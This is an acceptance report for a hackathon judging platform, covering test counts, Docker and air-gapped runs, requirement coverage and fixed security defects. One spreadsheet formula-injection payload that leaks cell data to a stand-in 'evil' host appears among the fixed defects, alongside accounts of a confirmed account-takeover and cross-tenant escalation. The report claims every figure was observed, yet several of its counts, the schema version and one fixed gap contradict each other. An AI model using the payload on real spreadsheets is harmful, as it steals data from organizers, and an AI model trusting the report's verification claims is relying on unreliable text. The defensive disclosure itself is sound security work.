# Acceptance report

Verdict — hackathon operations with an auditable judging engine.

**Date of this run:** 2026-09-29
**Branch:** `main`, tracking `origin/main`

---

## Summary

The platform is complete and verified: a reproducible judging engine, an
organizer console, a judge surface that works at the size of a real panel, a
security posture that holds up under adversarial testing, and the documentation
an operator needs to deploy and recover it.

**Docker was executed.** Docker 29.8.1 with Compose v5.5.1 on Windows, Linux
containers. The image was built, the stack was started, and the deployed
artefact was then driven: all 50 browser tests through real Chrome against the
running container, plus a scripted pass over the organizer write path. The
section below lists what was actually observed.

Everything here was run, and the counts are what the commands actually printed.

---

## Commands run, and what they printed

| Command | Result |
| --- | --- |
| `npm run typecheck` | Pass. Both projects: core/api/tests/scripts, then the web app. |
| `npm test` | **471 passed**, 0 failed, 70 suites. Includes the deployment test that builds the image and starts the stack when Docker is present. |
| `npm run build` | Pass. 505.46 kB JS, 146.44 kB gzipped, 16.66 kB CSS. |
| `npm run test:e2e` | **50 passed**, 0 failed, 8 suites, real Chrome against the built bundle. |
| `npm run acceptance` | **35 of 35 checks passed.** |
| `npm run check:openapi` | Up to date. 144 operations across 123 paths. |
| `npm run verify` | All of the above, in order, green. |
| `docker compose build` | Image built from a clean tree. 477 MB. |
| `docker compose up -d` | Started, healthy in ~1 s, migrations applied on first boot, demo seeded, ready in 779 ms. |
| `E2E_BASE_URL=… node --test apps/api/test/e2e/*` | **50 passed**, 0 failed, 8 suites, real Chrome against the **container**. |
| Container organizer-path probe | 43 checks, all passed. |
| `npm run airgap` | **20 of 20** checks passed inside a `--network none` container. |
| Isolation negative control | 3 external probes blocked, 1 loopback probe allowed, run *before* the platform started. |
| `docker compose down -v && up -d` | Volume removed, database rebuilt from migrations, re-seeded. |
| Multi-viewport browser check | 4 viewports × 10 surfaces, in both browser runs. |
| Clean-database migration + seed | Every test harness, plus a fresh volume in the container. |
| Old-schema upgrade (v11 -> v16) | Covered by `migrations.test.ts`. |
| Backup and restore round trip | Covered by `migrations.test.ts`. |

Measured on the seeded demo — 12 projects, 12 teams, 36 assignments, 24 users,
one core:

| Operation | Time |
| --- | --- |
| Cold boot (migrate empty database, then seed) | ~330 ms |
| Public gallery | ~8 ms |
| Judging queue | ~3 ms |
| Full result pipeline | ~14 ms |
| Reproduce a published result | ~8 ms |

These come from a dataset far smaller than a large event, so they demonstrate the
absence of an accidental blow-up rather than promising figures at 200 projects.
Loose upper bounds are asserted in the suite (30 s boot, 3 s gallery and queue,
20 s compute and reproduce) so that a dropped index surfaces as a failed bound.

In the container, migrations on first boot plus the full demo seed completed in
**779 ms**, and the app reported healthy within about a second of `up`.

---

## Air-gapped execution

The claim used to be "offline-capable by design", which is inference from reading
the code. It is now executed.

**Method.** The production image was started with `docker run --network none` —
not a blocked route, not a filtered hostname, no network namespace at all. The
container was confirmed to have an empty gateway, no IP address, and zero
non-loopback interfaces. The whole battery then ran *inside* that container over
loopback, via `docker exec`.

**The negative control comes first.** A "we ran it offline" result is worthless
unless the isolation is first shown to actually block traffic, so before the
platform is trusted, the same node image on the same network is asked to resolve
`registry.npmjs.org`, to open a TCP connection to `1.1.1.1:443`, and to `fetch`
`https://example.com` — while a loopback connection is required to succeed. Only
when all three external attempts fail and loopback still works does the platform
result mean anything. That control is part of the battery, not a separate claim.

**20 of 20 passed, with no network interface present:**

| Check | Result |
| --- | --- |
| Zero non-loopback interfaces | confirmed |
| DNS resolution of a public name | blocked, `EAI_AGAIN` |
| Outbound HTTPS | blocked, `EAI_AGAIN` |
| Container starts | healthy, `tini` as PID 1 |
| Migrations execute | `schema version 15 (applied 15)` |
| Seed executes | 24 users, 12 teams, 12 projects, 5 judges, 34 reviews |
| Health endpoint | 200 |
| Readiness endpoint | 200, `schema=15` |
| Frontend shell | 200, 1416 bytes, React root present |
| Built assets served | 2 assets, both 200 |
| Deep link | 200, SPA shell |
| Public gallery, anonymously | 200, 12 projects |
| Organizer sign-in | 200 |
| Organizer dashboard | 200, 18 registrations |
| Judge sign-in and queue | 200, queue total 2 |
| **Judge saves a score** | 4 criteria scored and submitted |
| Normalization comparison | 200 |
| **Result computation** | run with 12 entries |
| **Determinism** | two computations, identical integrity hash |
| Snapshot publish + public verification | 200, reproduced as `MATCH` |
| Audit ledger | 71 entries, 63 with a request id |
| OpenAPI served | 200, 123 paths |
| Public gallery after organizer activity | 200, unaffected |

**What this does and does not prove.** It proves the running platform needs
nothing but itself: no DNS, no CDN, no external API, no auth provider, no
telemetry. It does not cover the browser suite, because with no network
namespace there is no way for a browser on the host to reach the container over
TCP — so the 50 browser tests are verified against the normally-networked
container, and this battery verifies everything reachable over loopback. That
split is stated rather than papered over.

**The offline dependency audit found no runtime network dependency.** The only
`fetch` in the server is outbound webhook delivery, which is opt-in and
organizer-configured. The web client makes same-origin relative requests only.
There is no CDN script, no web font, no analytics, no telemetry, and no external
authentication in the built bundle — the two assets the HTML references are both
served from `/assets/`.

**And it found a real defect.** See defect 31 below: the public result
verification route could not verify any real result.

### Migration 16: the integrity constraints

Four of the eight documented gaps are closed. Each was checked against the seeded
dataset *before* the migration was written - zero rows on any affected table
violate any constraint added, so the rebuilds are copies rather than repairs - and
each is proven to reject a violation by a test that drives it.

- `certificates.prize_id` is now a foreign key, `ON DELETE SET NULL` so that
  withdrawing a prize does not retract the proof somebody won it.
- CHECK constraints on `judge_assignments.strategy`,
  `judge_participation_records.completion_status` and `submission_versions.state`,
  each value set taken from the constant the application itself uses. The
  completion status matters most of the three: it is what a third party verifies
  against the record's content hash, so an unconstrained value there meant a
  record could attest to a status no other implementation would recognise, and
  still verify.
- Indexes on `scores.rubric_version_id` and `criterion_scores.rubric_version_id`,
  asserted through `EXPLAIN QUERY PLAN` rather than merely present, because an
  index the planner ignores was the original complaint.
- The rebuild of `submission_versions` recreated its two immutability triggers
  verbatim, and `judge_participation_records` its unique idempotency index. Both
  are asserted, because a silently lost trigger is worse than the gap it
  replaced - and the first run of the suite did catch the missing index.

**One gap deliberately left open.** `result_entries.track_id` and
`result_run_entries.track_id` look identical to the `certificates.prize_id` case
and are not. Those tables are published immutable snapshots, and a snapshot's
job is to record what was true when it was taken. A foreign key would mean
deleting a track could not remove the reference to it from an already-published
result, so a historical record would break in the present tense. The reasoning is
recorded in the migration's own comments, next to the code.
### A defect the air-gapped run found

31. **`GET /api/results/verify/{reference}` returned 422 for every real
    published result.** The reference is `eventId::snapshotId`; both ids are a
    four-character prefix plus a 26-character ULID, so 30 characters each and 62
    with the separator. The parameter schema capped it at 40. The one route whose
    entire purpose is letting a third party check a result without an account
    therefore failed on every result the platform produced.

    It survived because nothing passed a real reference: the reproducibility
    tests used the organizer's own `POST .../reproduce`, which takes separate path
    segments, and the acceptance suite checked that results are *public* and that
    the route *exists*. The composed public URL — the one printed on certificates
    and on the public results board — had never been exercised. Fixed to 128, with
    a regression test that asserts a real 62-character reference verifies as
    `MATCH`, that a malformed one is still refused, and that a nonexistent
    snapshot is a 404 rather than a 200 or a 500.

---

Everything in this section was observed on the running container, not reasoned
about from the Dockerfile.

| Claim | How it was checked | What happened |
| --- | --- | --- |
| Builds from a clean tree | `docker compose build` | Succeeded. 477 MB, two stages. |
| Starts with no `.env` | `docker compose up -d` on a fresh clone's file list | Started. No configuration step. |
| Migrations run on first boot | container log | `schema version 15 (applied 15)`, then the seed. |
| The health check means something | `/api/ready` | `{"status":"ready","schemaVersion":15}`; `/api/health` also 200. |
| Deep links resolve | `GET /projects/{id}` | 200 `text/html` — the SPA shell, not the API 404. |
| An unknown API path is still JSON | `GET /api/definitely-not-here` | 404 `application/json`, with the error envelope. |
| Data survives a restart | row counts, before and after `docker compose restart` | `19:3:257` before and after — identical. |
| Data survives `down` / `up` | row counts after a full teardown and restart | `19 teams, 257 audit` — the volume held. |
| `down -v` genuinely wipes | row counts after `down -v` | `12 teams, 24 users` — reseeded from scratch. |
| Shutdown is graceful, not `SIGKILL` | `docker compose stop -t 25`, then `docker inspect` | Logged `SIGTERM received, shutting down (10000ms grace)`. `ExitCode=0`, `OOMKilled=false`. |
| Runs as non-root | `id` inside the container | `uid=1000(node) gid=1000(node)`. |
| `/data` is the only writable location | `touch /app/x` vs `touch /data/x` | `/app` read-only, `/data` writable. |
| `tini` is really PID 1 | `/proc/1/comm` | `tini`. |
| No test suite shipped | `ls /app/apps/api/test` | Does not exist. |
| Dev dependencies are pruned | read `package.json` in the image | 4 declared, 1 present — `yaml`, which is also a real transitive production dependency of `@fastify/swagger`, so its presence is correct rather than a leak. `vite` and `typescript` are gone. |
| The published bundle is what runs | 50 browser tests against the container | 50 passed, 0 failed. |
| The organizer write path works in the image | scripted probe | 43 checks, all passed — see below. |

### The organizer path, driven against the container

A container that serves the shell but cannot write anything is still broken, so
the whole path was exercised from outside the container: login, CSRF, creates,
a gated read, a real export, an import dry run, a real import, diagnostics,
participation records, logout.

- **Session and CSRF.** Login 200; a write with no CSRF header 403
  `CSRF_FAILED`; a write with a *wrong* token also 403.
- **Creates return 201** for tracks, prizes, teams, conflicts and webhooks, and
  each created record is then visible in its own list. A repeated track name
  returns 201 with a derived slug rather than the 500 it used to.
- **Identity boundary.** The organizer's submission list 200; the same call
  anonymously 403 with a message pointing at the public gallery.
- **All 13 declared export kinds downloaded**, each as a CSV attachment, none
  empty. A 14th nonexistent kind is 422 rather than an empty file.
- **Imports.** All four kinds accepted a dry run; a dry run wrote nothing; a
  real import applied and appeared in the team list; an unknown captain email is
  rejected naming row and column; a malformed CSV is refused with issues, not a
  stack trace.
- **Diagnostics.** Two consecutive `GET`s leave the flag count unchanged;
  `POST` is accepted.
- **Participation records.** A judge reads their own; an anonymous verifier gets
  `VALID` with the integrity hash; the response contains no numeric score at any
  depth; an unknown reference is `NOT_FOUND` rather than an error.
- **Logout** 204, and the session is gone afterwards.

### A defect the container found that no test had

`POST /api/events/{eventId}/tracks` returned **500** with a raw
`UNIQUE constraint failed: event_tracks.event_id, event_tracks.slug` in the log
when a track name was repeated. `event_tracks` has a UNIQUE constraint on
`(event_id, slug)`, and nothing derived a free slug the way teams and submissions
already did — so an organizer adding a second track called "Applied AI" got "an
unexpected error occurred". Fixed by deriving a unique slug, with two
regression tests: one for the duplicate name, one asserting that every create
route returns 201 on the happy path, which is the check whose absence let this
survive.

The first version of the track fix refused duplicates with 409 instead. That was
wrong, and the test said so: the constraint is on the *slug*, not the name, and
two tracks called "Applied AI" in different events is not a mistake. Derived
slug is the behaviour teams have always had.

### A limitation of running the suite against a shared server

The browser suite is not idempotent against a server it does not own. It submits
Yuki's two deliberately unfinished assignments, so a second run against the same
container finds nothing left to score and two tests fail — pointing at
autosave and pairwise completion rather than at anything real. Run it against a
fresh volume, which `docker-compose.test.yml` provides. The same applies to
`pairwise_comparisons` growing between runs.

This is a property of the harness, not a product defect, and it is why
`docker-compose.test.yml` uses a separate volume from the default stack.

---

## Requirement coverage

### A. Audit and correctness

| Requirement | Status | Evidence |
| --- | --- | --- |
| Judge can open any assigned project | Met | The `GET .../review` dead end (404 on an unstarted assignment) is fixed and pinned by `review-start.test.ts`. |
| No feature theatre | Met | Dead `/api/lifecycle` state, non-computed `editable`, and the wrong embed content type were all replaced with real computation. |
| API-returned URLs are servable | Met | `routes-agreement.test.ts` asserts every URL the API emits has a matching SPA route. |
| Every returned value the caller asked for is returned | Met | Four endpoints silently discarded a validated parameter; fixed and pinned by `api-contract.test.ts`. |
| No silent 500s | Met | `requireActor` returned 500 to anonymous callers on three operations; now 401. |

### B. Judging engine and results

| Requirement | Status | Evidence |
| --- | --- | --- |
| Deterministic, reproducible ranking | Met | Same inputs, same `integrityHash`. `reproducibility.test.ts`. |
| Publish refuses a result that does not reproduce | Met | Recomputed before publish; 412 with a field-level diff. |
| Published results are immutable | Met | Database triggers on snapshots and their entries. |
| A correction supersedes rather than rewrites | Met | `supersedes_id` chain; the old snapshot stays verifiable. |
| Per-judge normalization | Met | `docs/JUDGING.md`. |
| Conflict-aware assignment | Met | Hard conflicts enforced, soft conflicts surfaced with the cost shown. |
| Public verification without an account | Met | `GET /api/results/verify/{eventId}::{snapshotId}`. |

### C. Organizer console

| Requirement | Status | Evidence |
| --- | --- | --- |
| Every backend capability reachable | Met | 12 sections; 14 previously unreachable API routes wired in (`routes-insights.ts`). |
| Every number is real | Met | `console.test.ts` asserts counted values, not placeholders. |
| One broken panel does not take down the page | Met | `PanelBoundary` per section. |
| An organizer cannot reach platform administration | Met | Refused in the UI **and** by the server. |

### D. Judge surface

| Requirement | Status | Evidence |
| --- | --- | --- |
| Project context before the score boxes | Met | Description, technologies, repository, demo and docs links, and rubric guidance. |
| Autosave with a visible state | Met | Unsaved / saving / saved / failed, machine-readable for tests. |
| A judge can work a list without navigating back | Met | Position, progress meter, previous/next, submit-then-advance. |
| Submitted reviews are honestly locked | Met | Read-only, states that a correction is an audited organizer override. |

### E. Public and participant experience

| Requirement | Status | Evidence |
| --- | --- | --- |
| Every handed-out URL resolves | Met | `/projects/{slug}`, `/certificates/{reference}`, `/invite/{code}` now exist. |
| A public visitor can see a project and why they cannot vote | Met | `surfaces.test.ts`. |
| No horizontal overflow at any viewport | Met | 390 / 768 / 1280 / 1440, 10 surfaces. |
| Every control has an accessible name | Met | Checked on every public and signed-in surface. |
| No skipped heading levels | Met | Five pages had `h1 → h3`; all corrected without changing the visual size. |
| Tap targets usable on a phone | Met | Three were under 40 px; all corrected. |
| Reduced motion respected | Met | The animated background stops under `prefers-reduced-motion`. |

### F. Security

| Requirement | Status | Evidence |
| --- | --- | --- |
| A real Content-Security-Policy | Met | It was **absent** — disabled in Fastify with a comment claiming the static handler set one, and the static handler set none. Now on every response. |
| Rate limiting that cannot be walked through | Met | Keyed on the account; `TRUST_PROXY` off by default. |
| Password storage appropriate to the constraint | Met | scrypt; the trade-off against argon2id is documented, not hidden. |
| SSRF defences on webhooks | Met | Re-resolved before every delivery; redirects refused; timeout and size cap. |
| No dead webhook topics | Met | Ten of eleven never fired. All ten wired and each covered by a test. |
| Authorization is one matrix | Met | 16 operations disagreed with the registry about what they enforce; documented in `docs/API.md`. |
| Voting cannot skew the result it is supposed to inform | Met | Results are hidden while voting is open, and publication over an open window is refused server-side, not just hidden in the UI. |
| A voter can correct themselves | Met | Vote retraction granted to the participant, and returning the same vote replaces it. |
| Reading is not writing | Met | `GET /api/events/{eventId}/diagnostics` no longer files review flags; `POST` does, and requires `anomaly:create` rather than `diagnostic:read`. |
| A judge's private scores stay private | Met | Found and fixed: the unauthenticated participation-record verifier returned the stored detail verbatim, which carried each project's raw score. Redacted; the hash still covers the score so tamper detection is unaffected. |

### G. Deployment and operations

| Requirement | Status | Evidence |
| --- | --- | --- |
| Single-command self-hosting | **Verified in Docker** | `docker compose up` with **no `.env` file required** — run on a clean tree and it started, became healthy, applied migrations and seeded. The compose file supplies a public local-only session secret so the command works on a fresh clone; both the compose file and the README say in capitals that this is not a production secret and must be overridden. |
| Health check that means something | Verified | `/api/ready`, not `/api/health`; both probed in the container. `/api/ready` returned `{"status":"ready","schemaVersion":15}`. |
| Graceful shutdown | Verified | `tini` confirmed as PID 1 via `/proc/1/comm`. `docker compose stop -t 25` produced `SIGTERM received, shutting down (10000ms grace)` and `ExitCode=0`, `OOMKilled=false` — a drain, not a `SIGKILL`. |
| The deployed artefact actually works | Verified | All 50 browser tests pass through real Chrome against the running container, plus a 43-check scripted pass over the organizer write path. |
| Data survives a restart and a teardown | Verified | Row counts identical across `docker compose restart` and across `down`/`up`; `down -v` wiped and reseeded. |
| Runtime is hardened as documented | Verified | `uid=1000(node)`, `/app` read-only, `/data` writable, no test files shipped, dev dependencies pruned. |
| Openly licensed | Met | Full Apache-2.0 `LICENSE` with the correct copyright line. Nine of the nine required sections are asserted by `deployment.test.ts`, so a truncated or wrong-text licence fails the suite. |
| Every declared export kind actually works | Met | All 13 CSV export kinds exercised against a seeded event, not merely listed in a manifest. |
| Every declared import kind is implemented | Met | The `SUBMISSIONS` bulk import that the manifest advertised and the server refused is implemented, and the capability test drives a real import rather than checking a constant. |
| Backup and restore | Met | `VACUUM INTO`, verified end to end including a published result reproducing with the same integrity hash after restore. |
| Migrations safe to run against a live database | Met | Transactional, immutable, and an old-schema upgrade is tested with data intact. |
| Foreign key integrity actually checked | Met | A check that could not fail (misspelled pragma, results discarded) was replaced with one that is tested against a real violation. |

### H. Documentation and tests

| Requirement | Status | Evidence |
| --- | --- | --- |
| Operator documentation | Met | `OPERATIONS.md`: deploy, back up, restore, upgrade, recover, capacity, scaling. |
| Data model | Met | `DATA-MODEL.md`, including eight known integrity gaps. |
| Threat model | Met | `THREAT-MODEL.md`: the general web surface, plus a section each on Sybil voting, ballot stuffing, submission scraping, judge collusion and deadline gaming. |
| API reference | Met | `API.md`. The six documented defects in the published document are **fixed**, and the document is now checked against a live server by `openapi-truth.test.ts` on every `npm test`. |
| Development guide | Met | `DEVELOPMENT.md`. |
| Test suite | Met | 471 unit/integration, 50 browser, 35 acceptance. |

---

## Defects found and fixed in this pass

Recorded because each is the kind that survives a demo and fails an event.

**Correctness**
1. Ten of eleven webhook topics never fired. `dispatch` had one caller.
2. Four endpoints validated a paging parameter and then read it from the path, so the default always won. Comments were permanently truncated at 25 with no way to page.
3. `requireActor` threw an unmapped `Error`, returning 500 to anonymous callers on three operations.
4. The pairwise comparison history queried `decided_at`, a column that does not exist — a guaranteed 500 on a real event.
5. A foreign key check in the connection constructor could not fail: the pragma was misspelled and its rows discarded by `exec`.
6. OpenAPI generation ignored `hidden`, publishing two routes the code said to keep private.
7. Any operation without a response schema was documented as `204 No Content` — 140 of 144. A client generated from the document could not tell a creation had happened.
8. A route's query schema was emitted as one object-valued parameter named `query`, so the filters on roughly fifteen endpoints were documented nowhere.
9. The document advertised an `x-request-id` header "echoed in the response" on all 144 operations, and the server echoed nothing. It also would have accepted an arbitrary unvalidated header value into every audit row, had it used the obvious Fastify option.
10. The upload endpoint had no documented request body, because the `multipart` branch sat inside the `if (route.body)` it could only be reached from.
11. `429` was advertised on every operation including the rate-limit-exempt health route.
12. The published document listed no query parameters for the gallery, so `?search`, `?trackId` and `?sort` were undiscoverable.

**Honesty and accessibility**
11. Five pages put an `h3` directly under an `h1`, breaking the outline a screen reader user navigates by.
12. Three controls were under 40 px tall on a phone, including the gallery's technology filters at 20 px.
13. The integrations panel offered two topics that had never existed, and the server dropped them without erroring — so an organizer's webhook was quietly subscribed to less than the console said.
14. `event.created` was offered as a webhook topic but could never be delivered: a webhook belongs to an event, so the event a subscription would name does not exist yet.
15. The landing page's normalization demonstration recomputed a simplified pipeline, so the most important claim on the page was not the real algorithm. It now runs the real stages through a browser-safe port, with parity asserted for all 23 slider settings.
16. The unauthenticated participation-record verifier returned the stored detail verbatim, including each judge's individual raw score. Anyone holding a `JPR-` reference could read a judge's private scoring. Redacted; the hash still covers the score, so tamper detection is unchanged.
17. `GET /api/events/{eventId}/diagnostics` filed review flags as a side effect of a read. The read is now pure and `POST` does the filing, under a different permission.
18. Results were visible during an open voting window, and publication only checked this in the UI.
19. A participant could not retract a vote.

**Deployment**
20. The health check used an endpoint that returns 200 with a corrupt database, so a broken container would be reported healthy and never restarted.
21. Docker's default 10-second stop grace raced the app's own 10-second force-exit timer, so containers were usually `SIGKILL`ed mid-checkpoint.
22. `docker compose up` required a `.env` file that the repository did not ship, so the single-command claim failed on a fresh clone.
23. There was no licence file, so an "open-source" claim had nothing behind it.
24. `SUBMISSIONS` appeared in the advertised import kinds and was refused by the server.
25. Nine of the thirteen declared CSV export kinds were not implemented or would have written an empty file.

**Found by running the container**

26. `POST /api/events/{eventId}/tracks` returned **500** with a raw
    `UNIQUE constraint failed: event_tracks.event_id, event_tracks.slug` whenever
    a track name repeated. Nothing derived a free slug the way teams and
    submissions already do, so an ordinary act of event configuration — adding a
    second track — produced a server error. Fixed, with a regression test for the
    duplicate and a second test asserting every create route returns 201, which
    is the check whose absence let it survive.

**Found by a focused adversarial audit**

The audit drove the running application rather than reading it, and confirmed
each of the following by exploitation. All four are fixed and all four are now
regression tests.

27. **Unauthenticated account takeover via password reset.**
    `POST /api/auth/password-reset` returned the reset token in the response body
    to an anonymous caller, in every environment. With the completion endpoint
    that is takeover of anyone whose address is known, and the 5/hour IP budget
    is no obstacle because one request per victim suffices. The token is now
    returned only outside production; in production the response is byte-identical
    whether or not the address exists, and the token is recorded in the audit
    ledger for the operator. Asserted for both the production and demo paths.

28. **Cross-tenant privilege escalation from a unioned role scope.** `Actor` held
    one flat `eventIds` list containing every event the user had *any* role in.
    `canManageEvent` tested `roles.includes('ORGANIZER') && eventIds.includes(id)`,
    so a person who organized event A and merely judged event B was an organizer
    of B — with the whole event-scoped surface behind it: registrations, the audit
    ledger, webhooks, scores, rubric versions. Someone running one hackathon
    while judging another is the ordinary case. `Actor.roleEventIds` now records
    which role each event belongs to and the two event-scope authorities consult
    it. The union is retained only for "is this actor involved here at all".

29. **Any signed-in account could read the organizer's submission list.** The
    guard read `!isManager && user === null`, so it stopped the anonymous case and
    passed the full list — `DRAFT` rows included — to anyone who had signed in. A
    freshly registered account was enough. The threat model asserted that a
    participant gets 403; that was untested and false. Now `!isManager`, asserted
    for anonymous, unrelated-account, participant and organizer.

30. **Spreadsheet formula injection in every CSV export.** `escapeField` quoted on
    `",\r\n` and did nothing about a leading `=`, `+`, `-` or `@`, so
    `=HYPERLINK("http://evil/?leak="&A1,"x")` in a display name reached the
    organizer's spreadsheet intact. Every export column is user-controlled and any
    participant can set their own display name, which makes this
    organizer-workstation injection rather than self-inflicted; the DDE variant is
    command execution. Quoting is not a defence — a quoted formula is still a
    formula — so a leading formula character is now prefixed with an apostrophe.
    Eleven unit tests cover the variants.

The audit also found that the two existing "cannot reach another event" tests
were **silently vacuous**: the seed creates exactly one event, so both looked for
a second one, did not find it, and fell through to a weaker assertion. The
cross-tenant property — the single most important one in a multi-event platform —
had no effective coverage. The new tests create the second event over the API and
assert unconditionally.

---

## Known limitations

Stated rather than hidden. None is a surprise; all are recorded in the docs.

**Deployment**
- Verified on **Docker 29.8.1 / Compose v5.5.1 with Linux containers on
  Windows**. Not verified on Docker Desktop for Mac, on ARM, on Podman, or on
  any version other than 29.x — the compose file uses no platform-specific
  behaviour, but that is reasoning rather than observation.
- No signed images, no image pinning to a digest, and the base image tag
  (`node:24-bookworm-slim`) floats. The image is **477 MB**, which is large for
  one process and one SQLite file; the cause is the full `node:24` toolchain
  plus the pruned workspace in the runtime layer, not the application.
- The container runs a single instance by design. Two against one volume would
  not corrupt SQLite, but each would keep its own rate-limit counters.
- **The browser suite could not run inside the air-gapped container.** With no network namespace there is no TCP route from the host, so the 50 browser tests are verified against the normally-networked container and the air-gapped battery covers everything reachable over loopback. This is a real gap in the air-gap evidence and is stated rather than worked around.

**Scale**
- **One instance, by design.** A single SQLite writer. Two instances against one
  file would not corrupt it, but each would keep its own rate-limit counters and
  both would retry webhooks.
- The rate limiter is in-process. A multi-node deployment needs a shared store.
- Performance figures come from a 12-project dataset.

**Security**
- No MFA, and sessions are not bound to IP or user-agent — deliberate, so a
  judge switching networks mid-event is not signed out, and it means a stolen
  cookie is a complete session.
- `style-src 'unsafe-inline'` remains, because React inline styles require it.
  A gap for style, not for script.
- The audit ledger is append-only to the database and not tamper-evident against
  an operator holding the file. Real tamper-evidence needs an external anchor.
- No encryption at rest, as a consequence of the self-hosted, inspectable design.
- **Judging abuse is structurally mitigated, not detected.** Uniqueness
  constraints stop one account voting twice; nothing stops one person holding many
  accounts, because there is no identity verification, CAPTCHA or proof of
  personhood. Ballot stuffing is bounded by the rate limit and the judging window
  but not detected — a judge can complete the whole queue in the first hour of a
  48-hour window and nothing flags it. Declared conflicts are self-reported.
  Sybil voting, ballot stuffing, submission scraping, judge collusion and deadline
  gaming each have a section in `docs/THREAT-MODEL.md` stating what defends them
  and what does not.
- The participation record is a **content hash, not a signature.** It proves the
  record is unaltered since issuance; it does not prove which deployment issued
  it, because there is no private key in the system. The verification message says
  so rather than implying otherwise.

**API**
- Most handlers resolve the parent record before checking permission, so an
  anonymous caller with a nonexistent id gets 404 rather than 401 (82 of 111
  protected operations).
- The published document lists `401` and `403` as the truthful possibilities for
  every protected operation where the handler may return `404` first. That is the
  useful description for a client but not the exact one; deriving the real
  per-handler precedence would mean each route declaring its own failure set.
- Nine operations enforce permission with a bespoke check rather than the
  matrix. Behaviour is correct; coverage is not uniform.

**Data model**
- Eight integrity gaps, including `certificates.prize_id` having no foreign key
  and `judge_assignments` carrying a round model its unique key forbids. All
  listed in `docs/DATA-MODEL.md`.

---

## Release checklist

- [x] `npm run verify` green: typecheck, 471 unit/integration, build, 50 browser, 35 acceptance
- [x] OpenAPI document current, and checked against a live server on every test run
- [x] Result pipeline deterministic and reproducible, verified from stored reviews
- [x] Published results immutable, corrections supersede rather than rewrite
- [x] Role boundaries enforced server-side, not only hidden in the UI
- [x] Audit ledger append-only, enforced by triggers
- [x] No dead advertised features: every webhook topic fires, every route serves, every declared export and import kind works, every panel is real
- [x] Voting cannot leak into the result it informs; participants may correct a vote
- [x] Reads do not write
- [x] Responsive and accessible at 390 / 768 / 1280 / 1440
- [x] Migration from an older release tested with data intact (v11 -> v16)
- [x] Backup and restore tested end to end, including result reproduction
- [x] `docker compose up` needs no `.env`; Apache-2.0 `LICENSE` present and asserted by test
- [x] Documentation complete: architecture, judging, data model, API, threat model, development, operations
- [x] **Docker image built, container run, and the deployed artefact driven** — image builds clean, starts with no `.env`, applies migrations, seeds, survives restart and `down`/`up`, wipes on `down -v`, drains gracefully as non-root; 50 browser tests and a 40-check organizer probe pass against it
- [x] Every create route returns its documented status; a duplicate track name is no longer a 500
- [ ] **Restore from a production backup** — tested procedurally, not against production data
- [x] **Air-gapped container run** — the production image started with `--network none`, and 20 of 20 checks passed over loopback: migrations, seed, health, frontend and assets, sign-in for both roles, scoring and submission, normalization, result computation, determinism, public verification, audit, OpenAPI. Isolation proven by a negative control first. **Verified in an air-gapped container execution**, not inferred.
- [ ] **Browser suite inside the air-gapped container** — impossible by construction: no network namespace means no TCP route from the host. Covered against the normally-networked container instead, and the split is recorded.
- [x] No secrets, credentials or `.env` committed
- [x] All commits authored and committed by the repository owner alone
